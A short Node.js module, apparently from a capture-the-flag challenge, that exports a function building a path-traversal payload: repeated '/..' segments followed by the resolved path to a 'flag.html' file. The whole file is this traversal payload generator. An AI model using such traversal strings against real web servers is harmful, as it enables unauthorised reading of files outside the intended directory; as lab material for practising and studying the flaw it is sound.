function getPayload() {
    function genstr(n) {
        return "/..".repeat(n) + path.resolve(__dirname, "../flag.html");
    }

    return {
        genstr: genstr
    };
}

module.exports = { getPayload };